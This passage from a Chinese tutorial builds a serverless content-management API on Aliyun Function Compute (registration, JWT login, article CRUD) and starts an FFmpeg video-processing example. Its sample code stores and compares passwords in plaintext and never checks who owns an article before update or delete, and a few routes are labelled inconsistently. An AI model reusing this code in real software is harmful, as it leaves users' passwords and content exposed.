user│   │       ├── login.js│   │       └── register.js│   └── middleware│       └── auth.js└── template.yml\n\n其中，所有业务代码都放在 src 目录中：\n\nconfig/index.js 是配置文件，里面包含身份凭证等配置信息；\ndb/client.js 对表格存储的增删改查操作进行了封装，方便在函数中使用（将数据库的操作封装还有一个好处是，如果你之后想要迁移到其他数据库，只要修改 db&#x2F;client.js 中的逻辑，不用修改业务代码）；\nmiddleware 目录中是一些中间件，比如 auth.js，用于身份认证；\nfunctions 目录中就是所有函数，登录、注册、创建文章等，每个功能分别对应一个函数；\ntemplate.yaml 是应用配置文件，包括函数和 API 网关的配置。\n\n根据前面梳理的系统功能，我们需要实现以下几个 API：\n\n\n\n用户注册\nPOST &#x2F;user&#x2F;register\n\n\n\n用户登录\nPOST &#x2F;user&#x2F;login\n\n\n发布文章\nPOST &#x2F;article&#x2F;create\n\n\n查询文章\nGET &#x2F;article&#x2F;detail&#x2F;[article_id]\n\n\n更新文章\nPOST &#x2F;article&#x2F;update\n\n\n删除文章\nPUT &#x2F;article&#x2F;delete&#x2F;[article_id]\n\n\n\n每个 API 对应一个具体的函数，每个函数也都有一个与之对应的 API 网关触发器。由于这些函数属于同一个应用，所以我们可以通过一个 template.yaml 来定义所有函数。同时也可以在 template.yaml 中定义函数的 API 网关触发器，这样部署函数时，就会自动创建 API 网关。\n\n内容管理系统的 template.yaml 格式如下：\nROSTemplateFormatVersion: &#x27;2015-09-01&#x27;Transform: &#x27;Aliyun::Serverless-2018-04-03&#x27;Resources:  # 函数服务，该服务中的函数都是内容管理系统的函数  serverless-cms:    Type: &#x27;Aliyun::Serverless::Service&#x27;    Properties:      Description: &#x27;Serverless 内容管理系统&#x27;    # 函数名称    [functionName]:      Type: &#x27;Aliyun::Serverless::Function&#x27;      Properties:        # 函数路径        Handler: &lt;functionPath&gt;.handler        Runtime: nodejs12        CodeUri: &#x27;./&#x27;  # API 网关分组，分钟中的所有 API 都是内容管理系统的 API  ServerlessCMSGroup:     Type: &#x27;Aliyun::Serverless::Api&#x27;    Properties:      StageName: RELEASE      DefinitionBody:        &lt;Path&gt;: # 请求的 path          post: # 请求的 method            x-aliyun-apigateway-api-name: user_register # API 名称            x-aliyun-apigateway-fc: # 当请求该 API 时，要触发的函数，              arn: acs:fc:::services/$&#123;serverless-cms.Arn&#125;/functions/$&#123;&lt;functionName&gt;.Arn&#125;/              timeout: 3000\n\ntemplate.yaml 主要分为两部分： 函数定义和 API 网关定义，每个函数都有一个与之对应的 API 网关。我们用 serverless-cms 服务来表示内容管理系统这个应用，服务内的所有函数都是内容管理系统的函数。同理，ServerlessCMSGroup 这个 API 网关分组中的所有 API 都是内容管理系统的 API。\n完整的 template.yaml配置如下：\nROSTemplateFormatVersion: &#x27;2015-09-01&#x27;Transform: &#x27;Aliyun::Serverless-2018-04-03&#x27;Resources:  # 函数服务  serverless-cms:    Type: &#x27;Aliyun::Serverless::Service&#x27;    Properties:      Description: &#x27;Serverless 内容管理系统&#x27;    user-register:      Type: &#x27;Aliyun::Serverless::Function&#x27;      Properties:        Handler: src/function/user/register.handler        Runtime: nodejs12        CodeUri: &#x27;./&#x27;    user-login:      Type: &#x27;Aliyun::Serverless::Function&#x27;      Properties:        Handler: src/function/user/login.handler        Runtime: nodejs12        CodeUri: &#x27;./&#x27;    article-create:      Type: &#x27;Aliyun::Serverless::Function&#x27;      Properties:        Handler: src/function/article/create.handler        Runtime: nodejs12        CodeUri: &#x27;./&#x27;    article-detail:      Type: &#x27;Aliyun::Serverless::Function&#x27;      Properties:        Handler: src/function/article/detail.handler        Runtime: nodejs12        CodeUri: &#x27;./&#x27;    article-update:      Type: &#x27;Aliyun::Serverless::Function&#x27;      Properties:        Handler: src/function/article/update.handler        Runtime: nodejs12        CodeUri: &#x27;./&#x27;    article-delete:      Type: &#x27;Aliyun::Serverless::Function&#x27;      Properties:        Handler: src/function/article/delete.handler        Runtime: nodejs12        CodeUri: &#x27;./&#x27;  # API 网关分组  ServerlessCMSGroup:     Type: &#x27;Aliyun::Serverless::Api&#x27;    Properties:      StageName: RELEASE      DefinitionBody:        &#x27;/user/register&#x27;: # 请求的 path          post: # 请求的 method            x-aliyun-apigateway-api-name: user_register # API 名称            x-aliyun-apigateway-fc: # 当请求该 API 时，要触发的函数，              arn: acs:fc:::services/$&#123;serverless-cms.Arn&#125;/functions/$&#123;user-register.Arn&#125;/              timeout: 3000        &#x27;/user/login&#x27;:          post:            x-aliyun-apigateway-api-name: user_login            x-aliyun-apigateway-fc:              arn: acs:fc:::services/$&#123;serverless-cms.Arn&#125;/functions/$&#123;user-login.Arn&#125;/              timeout: 3000        &#x27;/article/create&#x27;:          post:            x-aliyun-apigateway-api-name: article_create            x-aliyun-apigateway-fc:              arn: acs:fc:::services/$&#123;serverless-cms.Arn&#125;/functions/$&#123;article-create.Arn&#125;/              timeout: 3000        &#x27;/article/detail/[article_id]&#x27;:          GET:            x-aliyun-apigateway-api-name: article_detail            x-aliyun-apigateway-request-parameters:              - apiParameterName: &#x27;article_id&#x27;                location: &#x27;Path&#x27;                parameterType: &#x27;String&#x27;                required: &#x27;REQUIRED&#x27;            x-aliyun-apigateway-fc:              arn: acs:fc:::services/$&#123;serverless-cms.Arn&#125;/functions/$&#123;article-detail.Arn&#125;/              timeout: 3000        &#x27;/article/update/[article_id]&#x27;:          PUT:            x-aliyun-apigateway-api-name: article_update            x-aliyun-apigateway-request-parameters:              - apiParameterName: &#x27;article_id&#x27;                location: &#x27;Path&#x27;                parameterType: &#x27;String&#x27;                required: &#x27;REQUIRED&#x27;            x-aliyun-apigateway-fc:              arn: acs:fc:::services/$&#123;serverless-cms.Arn&#125;/functions/$&#123;article-update.Arn&#125;/              timeout: 3000        &#x27;/article/delete/[article_id]&#x27;:          DELETE:            x-aliyun-apigateway-api-name: article_update            x-aliyun-apigateway-request-parameters:              - apiParameterName: &#x27;article_id&#x27;                location: &#x27;Path&#x27;                parameterType: &#x27;String&#x27;                required: &#x27;REQUIRED&#x27;            x-aliyun-apigateway-fc:              arn: acs:fc:::services/$&#123;serverless-cms.Arn&#125;/functions/$&#123;article-delete.Arn&#125;/              timeout: 3000\n\n在这份配置中，需要注意两个地方：\n函数的 Handler 配置，Handler 可以写函数路径，比如src/function/user/register.handler表示src/function/user/目录中的 register.js 文件中的 handler 方法；\nAPI 网关配置中的/article/detail/[article_id]Path，这种带参数的 PATH，必须使用x-aliyun-apigateway-request-parameters指定 Path 参数。\n接下来，我们就来实现内容管理系统的各个 API，也就是 template.yaml 中定义的各个函数。\n2.3 用户注册用户注册接口定义如下。\n请求方法：POST。\nPath：/user/register\n\n\nBody参数：username 用户名、password 密码。\n\n整体代码很简单，在入口函数 handler 中，通过 event 得到 API 网关传递过来的 HTTP 请求 body 数据，然后从中得到 username、password，再将用户信息写入数据库。\n// src/function/user/registerconst client = require(&quot;../../db/client&quot;);/** * 用户注册 * @param &#123;string&#125; username 用户名 * @param &#123;string&#125; password 密码 */async function register(username, password) &#123;  await client.createRow(&quot;user&quot;, &#123; username &#125;, &#123; password &#125;);&#125;module.exports.handler = function (event, context, callback) &#123;  // 从 event 中获取 API 网关传递 HTTP 请求 body 数据  const body = JSON.parse(JSON.parse(event.toString()).body);  const &#123; username, password &#125; = body;  register(username, password)    .then(() =&gt; callback(null, &#123; success: true &#125;))    .catch((error) =&gt;      callback(error, &#123; success: false, message: &quot;用户注册失败&quot; &#125;)    );&#125;;\n\n代码完成后，就可以将应用部署到函数计算：\n# 部署应用$ fun deployWaiting for service serverless-cms to be deployed......service serverless-cms deploy successWaiting for api gateway ServerlessCMSGroup to be deployed......api gateway ServerlessCMSGroup deploy success\n\n部署过程中，如果看到函数服务 serverless-cms 和 API 网关 ServerlessCMSGroup 都成功部署了，就说明应用部署完成。部署完成后，API 网关会提供一个用来测试的 API Endpoint，当然你也可以绑定自定义域名。\n我们可以通过 curl 测试一下：\n$ curl http://a88f7e84f71749958100997b77b3e2f6-cn-beijing.alicloudapi.com/user/register \\-X POST \\-d &quot;username=Jack&amp;password=123456&quot;&#123;&quot;success&quot;:true&#125;\n\n返回 &#123;&quot;success&quot;: true&#125; ，说明用户注册成功。这时在表格存储控制台也可以看到刚注册的用户。\n\n2.4 用户登录完成用户注册函数开发后，就可以接着开发登录。用户登录的接口定义如下。\n\n请求方法：POST。\nPath：&#x2F;user&#x2F;login\nBody 参数：username 用户名、password 密码。\n\n\n登录的逻辑就是根据用户输入的密码是否正确，如果正确就生成一个 token 返回给调用方。代码实现如下：\n\n// src/function/user/loginconst assert = require(&quot;assert&quot;);const jwt = require(&#x27;jsonwebtoken&#x27;);const &#123; jwt_secret &#125; = require(&quot;../../config&quot;);const client = require(&quot;../../db/client&quot;);/** * 用户登录 * @param &#123;string&#125; username 用户名 * @param &#123;string&#125; password 密码 */async function login(username, password) &#123;  const user = await client.getRow(&quot;user&quot;, &#123; username &#125;);  assert(user &amp;&amp; user.password === password);  const token = jwt.sign(&#123; username: user.username &#125;, jwt_secret);  return token;&#125;module.exports.handler = function (event, context, callback) &#123;  const body = JSON.parse(JSON.parse(event.toString()).body);  const &#123; username, password &#125; = body;  login(username, password)    .then((token) =&gt; callback(null, &#123; success: true, data: &#123; token &#125; &#125;))    .catch((error) =&gt;      callback(error, &#123; success: false, message: &quot;用户登录失败&quot; &#125;)    );&#125;;\n\n将其部署到函数计算后，我们也可以使用 curl 命令进行测试：\n$ curl http://a88f7e84f71749958100997b77b3e2f6-cn-beijing.alicloudapi.com/user/login \\-X POST \\-d &quot;username=Jack&amp;password=123456&quot;&#123;&quot;success&quot;:true,&quot;data&quot;:&#123;&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkphY2siLCJpYXQiOjE2MTE0OTI2ODF9.c56Xm4RBLYl5yVtR_Vk0IZOL0yijofcyE-P7vjKf4nA&quot;&#125;&#125;\n\n2.5 身份认证在完成了注册登录接口后，我们再来看一下内容管理系统中，身份认证应该怎么实现。\n在之前，我们实现了一个 Express.js 框架的身份认证中间件，用来拦截所有请求，身份认证通过后才能进执行后面的代码逻辑。在内容管理系统中，你也可以参考 Express.js 的思想，实现一个 auth.js 专门用于身份认证，代码如下：\n// src/middleware/auth.jsconst jwt = require(&quot;jsonwebtoken&quot;);const &#123; jwt_secret &#125; = require(&quot;../config/index&quot;);/** * 身份认证 * @param &#123;object&#125; event API 网关的 event 对象 * @return &#123;object&#125; 认证通过后返回 user 信息；认证失败则返回 false */const auth = function (event) &#123;  try &#123;    const data = JSON.parse(event.toString());    if (data.headers &amp;&amp; data.headers.Authorization) &#123;      const token = JSON.parse(event.toString())        .headers.Authorization.split(&quot; &quot;)        .pop();      const user = jwt.verify(token, jwt_secret);      return user;    &#125;    return false;  &#125; catch (error) &#123;    return false;  &#125;&#125;;module.exports = auth;\n\n\n其原理很简单，就是从 API 网关的 event 对象中获取 token，然后验证 token 是否正常。如果认证通过，就返回 user 信息，失败就返回 false。\n这样在需要身份认证的函数中，你只引入 auth.js 并传入 event 对象就可以了。下面是一个简单的示例：\n\nconst auth = require(&#x27;./middleware/auth&#x27;);module.exports.handler = function (event, context, callback) &#123;  // 使用 auth 进行身份认证  const user = auth(event);  if (!user) &#123;    // 若认证失败则直接返回    return callback(&#x27;身份认证失败!&#x27;)  &#125;  // 通过身份认证后的业务逻辑  // ...  callback(null);&#125;;\n\n\n除了登录注册，其他接口都需要身份认证，所以接下来我们就通过实现“发布文章”函数来实际使用 auth.js。\n\n2.6 发布文章发布文章的接口定义如下。\n\n请求方法：POST。\nPath：&#x2F;article&#x2F;create\nHeaders 参数: Authorization token。\nBody 参数：title、content。\n\n\n由于登录后才能发布文章，所以要先通过登录接口获取 token，然后调用 &#x2F;article&#x2F;create 接口时，再将 token 放在 HTTP Headers 参数中。发布文章的代码实现如下：\n\n// src/function/article/authconst uuid = require(&quot;uuid&quot;);const auth = require(&quot;../../middleware/auth&quot;);const client = require(&quot;../../db/client&quot;);/** * 创建文章 * @param &#123;string&#125; username 用户名 * @param &#123;string&#125; title 文章标题 * @param &#123;string&#125; content 文章内容 */async function createArticle(username, title, content) &#123;  const article_id = uuid.v4();  const now = new Date().toLocaleString();  await client.createRow(    &quot;article&quot;,    &#123;      article_id,    &#125;,    &#123;      username,      title,      content,      create_date: now,      update_date: now,    &#125;  );  return article_id;&#125;module.exports.handler = function (event, context, callback) &#123;  // 身份认证  const user = auth(event);  if (!user) &#123;    // 若认证失败则直接返回    return callback(&quot;身份认证失败&quot;);  &#125;  // 从 user 中获取 username  const &#123; username &#125; = user;  const body = JSON.parse(JSON.parse(event.toString()).body);  const &#123; title, content &#125; = body;  createArticle(username, title, content)    .then(() =&gt;      callback(null, &#123;        success: true,      &#125;)    )    .catch((error) =&gt;      callback(error, &#123;        success: false,        message: &quot;创建文章失败&quot;,      &#125;)    );&#125;;\n\n首先是使用 auth.js 进行身份认证，认证通过后就可以从 user 中获取 username。然后再从请求体中获取文章标题和文章内容数据，将其存入数据库。\n接下来我们依旧可以将函数部署和使用 curl 进行测试：\n$ curl http://a88f7e84f71749958100997b77b3e2f6-cn-beijing.alicloudapi.com/article/create \\-X POST \\-d &quot;title=这是文章标题&amp;content=内容内容内容......&quot; \\-H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkphY2siLCJpYXQiOjE2MTE0OTI2ODF9.c56Xm4RBLYl5yVtR_Vk0IZOL0yijofcyE-P7vjKf4nA&quot;&#123;&quot;success&quot;:true,&quot;data&quot;:&#123;&quot;article_id&quot;:&quot;d4b9bad8-a0ed-499d-b3c6-c57f16eaa193&quot;&#125;&#125;\n\n在测试时，我们需要将 token 放在 HTTP 请求头的 Authorization 属性中。文章发布成功后，你就可以在表格存储中看到对应的数据了。\n\n2.7 查询文章\n发布文章的接口开发完成后，我们继续开发一个查询文章的接口，这样就可以查询出刚才创建的文章。查询文章接口定义如下。\n\n\n请求方法：GET。\nPath：/article/detail/[article_id]\nHeaders 参数: Authorization token。\n\n\n在查询文章接口中，我们需要在 Path 中定义文章 ID 参数，即 article_id。这样在函数代码中，你就可以通过 event 对象的 pathParameters 中获取 article_id 参数，然后根据 article_id 来查询文章详情了。完整代码如下：\n\nconst uuid = require(&quot;uuid&quot;);const auth = require(&quot;../../middleware/auth&quot;);const client = require(&quot;../../db/client&quot;);/** * 获取文章详情 * @param &#123;string&#125; title 文章 ID */async function getArticle(article_id) &#123;  const res = await client.getRow(    &quot;article&quot;,    &#123;      article_id,    &#125;,  );  return res;&#125;module.exports.handler = function (event, context, callback) &#123;  // 身份认证  const user = auth(event);  if (!user) &#123;    // 若认证失败则直接返回    return callback(&quot;身份认证失败&quot;);  &#125;    // 从 event 对象中获取文章 ID  const article_id = JSON.parse(event.toString()).pathParameters[&#x27;article_id&#x27;];  getArticle(article_id)    .then((detail) =&gt;      callback(null, &#123;        success: true,        data: detail      &#125;)    )    .catch((error) =&gt;      callback(error, &#123;        success: false,        message: &quot;创建文章失败&quot;,      &#125;)    );&#125;;\n\n开发完成后，我们可以将其部署到函数计算，再用 curl 命令进行测试：\n$ curl http://a88f7e84f71749958100997b77b3e2f6-cn-beijing.alicloudapi.com/article/detail/d4b9bad8-a0ed-499d-b3c6-c57f16eaa193 \\-H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkphY2siLCJpYXQiOjE2MTE0OTI2ODF9.c56Xm4RBLYl5yVtR_Vk0IZOL0yijofcyE-P7vjKf4nA&quot;&#123;&quot;success&quot;:true,&quot;data&quot;:&#123;&quot;article_id&quot;:&quot;d4b9bad8-a0ed-499d-b3c6-c57f16eaa193&quot;,&quot;content&quot;:&quot;内容内容内容......&quot;,&quot;create_date&quot;:&quot;1/24/2021, 2:05:46 PM&quot;,&quot;title&quot;:&quot;这是文章标题&quot;,&quot;update_date&quot;:&quot;1/24/2021, 2:05:46 PM&quot;,&quot;username&quot;:&quot;Jack&quot;&#125;&#125;\n\n如上所示，查询文章的接口按照预期返回了文章详情。\n2.8 更新文章\n更新文章的 API Path 参数和查询文章一样，都需要 Path 中定义 article_id。而其 body 参数则与创建文章相同。此外，更新文章的请求 method 是 PUT，因为在 Restful API 规范中，我们通常使用 POST 来表示创建， 使用 PUT 来表示更新。\n\n更新文章的接口定义如下。\n请求方法：PUT。\n\nPath：&#x2F;article&#x2F;update&#x2F;[article_id]\nHeaders 参数: Authorization token。\nBody 参数：title、content。\n\n更新文章的逻辑就是根据 article_id 去更新一行数据。代码如下：\nconst auth = require(&quot;../../middleware/auth&quot;);const client = require(&quot;../../db/client&quot;);/** * 更新文章 * @param &#123;string&#125; article_id 待更新的文章 ID * @param &#123;string&#125; title 文章标题 * @param &#123;string&#125; content 文章内容 */async function updateArticle(article_id, title, content) &#123;  const now = new Date().toLocaleString();  await client.updateRow(    &quot;article&quot;,    &#123;      article_id,    &#125;,    &#123;      title,      content,      update_date: now,    &#125;  );&#125;module.exports.handler = function (event, context, callback) &#123;  // 身份认证  const user = auth(event);  if (!user) &#123;    // 若认证失败则直接返回    return callback(&quot;身份认证失败&quot;);  &#125;  const eventObject = JSON.parse(event.toString())  // 从 event 对象的 pathParameters 中获取 Path 参数  const article_id = eventObject.pathParameters[&#x27;article_id&#x27;];  const body = JSON.parse(eventObject.body);  // 从 event 对象的 body 中获取请求体参数  const &#123; title, content &#125; = body;  updateArticle(article_id, title, content)    .then(() =&gt;      callback(null, &#123;        success: true,      &#125;)    )    .catch((error) =&gt;      callback(error, &#123;        success: false,        message: &quot;更新文章失败&quot;,      &#125;)    );&#125;;\n\n开发并部署完成后，使用 curl 命令进行测试：\n$ curl http://a88f7e84f71749958100997b77b3e2f6-cn-beijing.alicloudapi.com/article/update/d4b9bad8-a0ed-499d-b3c6-c57f16eaa193 \\-X PUT \\-d &quot;title=这是文章标题&amp;content=更新的内容......&quot; \\-H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkphY2siLCJpYXQiOjE2MTE0OTI2ODF9.c56Xm4RBLYl5yVtR_Vk0IZOL0yijofcyE-P7vjKf4nA&quot;&#123;&quot;success&quot;:true&#125;\n\n返回 &#123;&quot;success&quot;:true&#125; 则说明更新成功。\n2.9 删除文章\n最后就还是一个删除文章的 API 了。删除文章的 API 也需要在 Path 中定义 article_id 参数，并且其 HTTP method 是 DELETE。具体接口定义如下。\n\n\n请求方法：DELETE。\nPath：&#x2F;article&#x2F;delete&#x2F;[article_id]\nHeaders 参数: Authorization token，\n删除文章很简单，就是根据 article_id 删除一行数据，代码如下：\n\nconst uuid = require(&quot;uuid&quot;);const auth = require(&quot;../../middleware/auth&quot;);const client = require(&quot;../../db/client&quot;);/** * 删除文章 * @param &#123;string&#125; title 文章 ID */async function deleteArticle(article_id) &#123;  const res = await client.deleteRow(    &quot;article&quot;,    &#123;      article_id,    &#125;,  );  return res;&#125;module.exports.handler = function (event, context, callback) &#123;  // 身份认证  const user = auth(event);  if (!user) &#123;    // 若认证失败则直接返回    return callback(&quot;身份认证失败&quot;);  &#125;    // 从 event 对象中获取文章 ID  const article_id = JSON.parse(event.toString()).pathParameters[&#x27;article_id&#x27;];  deleteArticle(article_id)    .then(() =&gt;      callback(null, &#123;        success: true,      &#125;)    )    .catch((error) =&gt;      callback(error, &#123;        success: false,        message: &quot;删除文章失败&quot;,      &#125;)    );&#125;;\n\n同样我们可以通过 curl 命令进行测试：\ncurl http://a88f7e84f71749958100997b77b3e2f6-cn-beijing.alicloudapi.com/article/delete/d4b9bad8-a0ed-499d-b3c6-c57f16eaa193 \\-X DELETE \\-H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkphY2siLCJpYXQiOjE2MTE0OTI2ODF9.c56Xm4RBLYl5yVtR_Vk0IZOL0yijofcyE-P7vjKf4nA&quot;&#123;&quot;success&quot;:true&#125;\n\n删除成功后，再去表格存储中就找不到这行记录了。至此，内容管理系统的 Restful API 就开发完毕了。\n2.10 总结\n可以看到，基于 Serverless 开发 Restful API 的整个代码非常简单，每个函数只负责一个独立的业务，职责单一、逻辑清晰。关于这一讲，我想强调这样几个重点：\n\n\n基于 Serverless 开发 API 时，建议你使用 API 网关进行 API 的管理；\n对于数据库等第三方服务，建议对其基本操作进行封装，这样更方便进行扩展；\nServerless 函数需要保持简单、独立、单一职责。\n\n3 基于 Serverless 开发高可用音视频处理系统Serverless 的应用场景非常广泛，它还可以用于大数据计算、物联网应用、音视频处理等。为了让你了解到更多的 Serverless 的应用场景，我准备了今天的内容。\n音视频处理是一个 CPU 密集型的操作，非常消耗计算资源，以往我们处理视频就要采购大量的高性能服务器，财务成本和维护成本都很高。有了 Serverless 后，就不用再关心计算资源不足的问题，也不用担心服务器的维护，并且还能降低成本。\n接下来，我先带你了解传统的音视频处理方案，然后在此基础上再带你学习并实践基于 Serverless 的音视频处理系统，这样你理解得会更加深入。\n3.1 传统音视频处理方案近几年，计算机技术和通信技术日新月异，信息传播的媒介也在不断演变，从文字到图片再到视频，各种短视频、直播甚至 AR、VR 等产品百花齐放。在这些产品的背后，离不开音视频处理技术。\n得益于云计算的发展，有些云厂商推出了对应的视频解决方案，因此你现在要搭建一个视频处理程序是很容易的（下图就是一个典型的视频处理方案）：\n\n在该方案中，我们用 OSS 来存储海量的视频内容，视频上传后用视频转码服务将不同来源的视频进行转码，以适配各种终端，然后利用 CDN 提升客户端访问视频的速度。\n不过，虽然用了视频转码服务，但我们还是要购买大量的服务器，搭建自己的视频处理系统，对视频进行更高级的自定义处理，比如视频转码后将元数据存入数据库、生成视频前几秒的 GIF 图片用来做视频的封面，以及各种格式的音视频转换等。\n除此之外，当我们已经在服务器上部署了一套视频处理系统后，可能还会遇到一些问题。比如，如何应对大量并发任务？能否让这个系统有更高的弹性和可用性？这些问题其实超出了视频处理本身的范围，我们的需求只是进行视频处理，但不得不面临繁重的运维工作。并且我们可能为了应对周期大量处理任务或瞬时流量，不得不购买大量的服务器，成本大幅增加，在服务器的闲置期间还造成了不必要的资源浪费。而且我们也无法 100% 利用机器的性能，这也是一种资源浪费。\n而 Serverless 就能解决这些问题，基于 Serverless 你可以很轻松实现一个弹性、可扩展、低成本、免运维、高可用的音视频处理系统。\n3.2 基于 Serverless 的音视频处理系统\n从基础设施的角度来看，基于 Serverless 的音视频解决方案，主要是替换了传统方案中的计算资源，也就是替换了服务器。\n此外，我们基于 Serverless 平台提供的丰富的触发器，也能简化编程模型。比如以往我们需要用户将视频上传到 OSS 后，再通过接口主动通知服务器进行视频处理，但在 Serverless 架构中，我们可以为函数设置 OSS 触发器，这样只要有文件被上传到 OSS 中，就可以触发函数执行，进而简化了业务逻辑。\n\n下图就是基于 Serverless 的视频处理系统解决方案：\n\n用户将视频上传后 OSS 后，触发函数计算中的视频转码函数执行，该函数对视频进行转码后，将元数据存入数据库，然后将转码后的视频再保存到 OSS 中。\n接下来我们就实现一个基于 Serverless 的音视频处理系统，系统主要有以下几个功能：\n\n获取视频时长；\n获取视频元数据；\n截取视频 GIF 图；\n为视频添加水印；\n对视频进行转码。\n\n为了方便你实践，我为你提供了一份示例代码，你可以通过 git 下载查看：\n$ git clone https://github.com/poetries/serverless-class$ cd 18/serverless-video\n\n代码结构如下：\n.├── functions│   ├── common│   │   └── utils.js│   ├── get_duration│   │   └── index.js│   └── get_meta│       └── index.js├── build.js├── ffmpeg├── ffprobe├── package.json└── template.yml\n\n\n其中 functions 中是函数源代码，common&#x2F;utils.js是一些公共方法，get_duration、get_meta等目录则分别对应的每个具体的功能。build.js是用来构建函数的脚本。在代码中，我们会使用 FFmpeg 进行视频处理，FFmpeg 是一款功能强大、用途广泛的开源软件，很多视频网站都在用它，比如 Youtube、Bilibili。ffmpeg 和 ffprobe 是 FFmpeg 的两个命令行工具，我们会将其作为依赖部署到 FaaS 平台（函数计算）上，这样在函数中就可以使用这两个命令来处理视频了。\n\n接下来就让我们学习具体如何实现。\n由于这几个函数的逻辑基本类似，所以我主要针对“获取视频时长”函数进行讲解，学会了这个函数的实现就很容易理解其他函数了。另外，由于该视频处理系统用到了公共方法及依赖，所以我还会为你介绍如何部署这些函数。\n3.3 获取视频时长函数的实现首先是获取视频时长的实现，也就是 get_duration 函数。我们可以通过 ffprobe 来获取视频时长，命令如下：\n$ ffprobe -v quiet -show_entries format=duration -print_format json -i video.mp4&#123;    &quot;format&quot;: &#123;        &quot;duration&quot;: &quot;170.859000&quot;    &#125;&#125;\n\n\n其中-print_format json是指以 JSON 格式输出结果，-i是指定文件位置，可以是本地文件，也可以是网络上的远程文件。\n\n所以获取视频时长的函数逻辑就是： 下载 OSS 中的文件到本地，然后运行 ffprobe 命令得到视频时长，最后返回视频时长。\n为了让代码尽可能复用，所以我在common/utils.js中实现了一些公共方法，代码大致如下：\n// common/utils.js// .../** * 运行 Linux 命令 * @param &#123;string&#125; command 待运行的命令 */async function exec(command) &#123;  console.log(command)  return new Promise((resolve, reject) =&gt; &#123;    child_process.exec(command, (err, stdout, stderr) =&gt; &#123;      if (err) &#123;        console.error(err)        return reject(err);      &#125;      if (stderr) &#123;        console.error(stderr)        return reject(stderr);      &#125;      console.log(stdout)      return resolve(stdout);    &#125;);  &#125;);&#125;/** * 获取 OSS Client * @param &#123;object&#125; context 函数上下文 */function getOssClient(context) &#123;  // 获取函数计算的临时访问凭证  const accessKeyId = context.credentials.accessKeyId;  const accessKeySecret = context.credentials.accessKeySecret;  const securityToken = context.credentials.securityToken;  // 初始化 OSS 客户端  const client = oss(&#123;    accessKeyId,    accessKeySecret,    stsToken: securityToken,    bucket: OSS_BUCKET_NAME,    region: OSS_REGION,  &#125;);  return client;&#125;module.exports = &#123;  exec,  getOssClient,  OSS_VIDEO_NAME,&#125;;\n\n\ncommon&#x2F;utils.js的代码主要就包含两个方法：exec和getOssClient，分别用来执行 Linux 系统命令和获取 OSS 客户端。\n\n这样我们在functions&#x2F;get_duration&#x2F;index.js中就可以直接引入并使用了：\n// functions/get_duration/index.jsconst &#123; exec, getOssClient, OSS_VIDEO_NAME &#125; = require(&quot;../common/utils&quot;);/** * 获取视频元信息 * @param &#123;object&#125; client OSS client */async function getDuration(client) &#123;  const filePath = &quot;/tmp/video.mp4&quot;;  await client.get(OSS_VIDEO_NAME, filePath);  const command = `./ffprobe -v quiet -show_entries format=duration -print_format json -i $&#123;filePath&#125;`;  const res = await exec(command);  return res;&#125;module.exports.handler = function (event, context, callback) &#123;  // 获取 OSS 客户端  const client = getOssClient(context);  getDuration(client)    .then((res) =&gt; &#123;      console.log(&quot;视频时长: \\n&quot;, res);      callback(null, res);    &#125;)    .catch((err) =&gt; callback(err));&#125;;\n\n首先注意第 20 行，我们通过 getOssClient 获取到 OSS 客户端，然后调用 getDuration 函数执行业务逻辑，也就是获取视频时长。\n在 getDuration 中，我们先下载视频到临时目录&#x2F;tmp&#x2F;video.mp4中，临时目录是可以读写的，当前代码目录只能写不能读。然后在第 13 行，通过 exec 执行了获取视频时长的命令，最后将得到的结果返回。\n这样获取视频时长的功能就开发完成了。\n获取视频元数据等其他函数与获取视频时长的实现是非常类似的，不同之处主要在于执行的命令，也就是第 12 行的command变量。具体实现可以参考我的示例代码，这里就不赘述。\n由于该系统包含多个函数，且函数不仅依赖了 ffmpeg ，还依赖了公共的common/utils.js，所以很多同学就犯难了，这些函数应该怎么部署呢？\n3.4 音视频处理系统的部署我们需要将 ffmpeg 或 ffprobe 上传。看起来比较简单，我们直接将其放在函数代码目录并上传就可以了。\n不过这里需要注意的是， 由于 ffmpeg 和 ffprobe 是可执行文件，最终我们需要用到这两个命令，所以在上传到 FaaS 平台之前，需要为其赋予可执行权限。\n你可以通过ls -l来查看文件的权限：\n$ ls -l-rwxr-xr-x    1 root  staff  39000328  2  9 20:59 ffmpeg-rwxr-xr-x    1 root  staff  38906056  2  9 21:00 ffprobe\n\n-rwxr-xr-x分为四部分：\n\n第 0 位-表示文件类型；\n第 1-3 位rwx表示文件所有者的权限；\n第 4-6 位r-x是同组用户的权限；\n第 7-9r-x位表示其他用户的权限。\n\n\nr 表示读权限，w 表示写权限，x 表示执行权限。从文件权限可以看出，针对所有用户这两个文件都有可执行权限。\n\n如果你的这两个文件没有执行权限，则需要通过下面的命令添加权限：\n$ chmod +x ffmpeg$ chmod +x ffprobe\n\n\n这样在 FaaS 平台上，Node.js 才可以执行这两个命令。\n解决了可执行文件的权限问题后，还有一个问题是函数的权限。\n\n由于函数需要读写 OSS，所以我们需要为函数设置角色，并为该角色添加管理 OSS 的权限。如果你不清楚如何授权，可以复习一下 “10｜访问控制：如何授权访问其他云服务？”的内容。\n\n在我提供的示例代码中，我在 template.yaml 的第 7 行设置了函数的角色acs:ram::1457216987974698:role&#x2F;aliyunfclogexecutionrole，文件内容如下所示：\n\nROSTemplateFormatVersion: &#x27;2015-09-01&#x27;Transform: &#x27;Aliyun::Serverless-2018-04-03&#x27;Resources:  serverless-video:    Type: &#x27;Aliyun::Serverless::Service&#x27;    Properties:      Role: acs:ram::1457216987974698:role/aliyunfclogexecutionrole      Description: &#x27;基于 Serverless 开发高可用音视频处理系统&#x27;    get_duration:      Type: &#x27;Aliyun::Serverless::Function&#x27;      Properties:        Handler: index.handler        Runtime: nodejs12        Timeout: 600        MemorySize: 256        CodeUri: ./.serverless/get_duration    get_meta:      Type: &#x27;Aliyun::Serverless::Function&#x27;      Properties:        Handler: index.handler        Runtime: nodejs12        Timeout: 600        MemorySize: 256        CodeUri: ./.serverless/get_meta      ......\n\n细心的你可能发现了，在该 YAML 